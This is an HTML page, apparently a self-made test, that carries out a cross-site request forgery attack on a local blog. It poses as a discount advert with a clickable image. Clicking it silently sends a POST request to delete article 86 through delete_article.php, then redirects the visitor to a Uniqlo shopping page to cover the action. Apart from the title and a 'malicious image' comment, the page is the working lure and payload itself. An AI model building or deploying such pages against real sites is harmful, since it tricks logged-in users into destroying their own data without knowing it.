<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
    <title>Test to Delete the Data in my blogs.</title>
    <meta name="description" content="優惠廣告!">
    <meta name="author" content="tseng">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
  </head>
  <body>
    <div class="main">
      <div class="container">
        <div class="row">
          <div class="col-sm">
            <div class="alert alert-primary" role="alert">
              <p class="text-center">特價優惠商品!</p>
            </div>
          </div>

			<!-- 惡意圖片 -->
			<a href="javascript:void(0);" data-id="86" class="del_article"><img src="https://i.imgur.com/fvJ5tsY.png"/></a>

        </div>
      </div>
    </div>
  </body>
  <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
  <script type="text/javascript">
  <!-- 當文件準備好，要做的事情是 -->
    $(document).ready(function()
    {
      $("a.del_article").click(function(){
          $.ajax({// 要傳送的包裹
            type : "post",// 在後端用表單送出去
            url : "http://localhost/13/php/delete_article.php",// 要送給誰處理
			data :
			 {
				'i' : $(this).attr("data-id"),

			 },
            dataType : 'html', // check_username.php處理完後應該回傳html式
          }).done(function(data)
          {// 有正常接收訊息, 回傳的訊息叫作 data
            if(data == 'yes')
            {
              // 登入成功

              window.location.href = "https://www.uniqlo.com/tw/?gclid=CjwKCAjw5cL2BRASEiwAENqAPvFIzONBhsBFg6kj6Jw2AoHeBtrtz--b9mX5twrfUrhRuVl3NLExnBoCbE4QAvD_BwE&gclsrc=aw.ds";

            }else
            {
              alert("error!");
              window.location.href = "https://www.uniqlo.com/tw/?gclid=CjwKCAjw5cL2BRASEiwAENqAPvFIzONBhsBFg6kj6Jw2AoHeBtrtz--b9mX5twrfUrhRuVl3NLExnBoCbE4QAvD_BwE&gclsrc=aw.ds";
            }
          }).fail(function(jqXHR, textStatus, errorThrown){
            // 失敗的時候
            alert("failed!");
            window.location.href = "https://www.uniqlo.com/tw/?gclid=CjwKCAjw5cL2BRASEiwAENqAPvFIzONBhsBFg6kj6Jw2AoHeBtrtz--b9mX5twrfUrhRuVl3NLExnBoCbE4QAvD_BwE&gclsrc=aw.ds";
          });

      });

      // 因為 javascript.void(0) 就會擋掉，所以不用再寫 return false;
    });
</script>
</html>
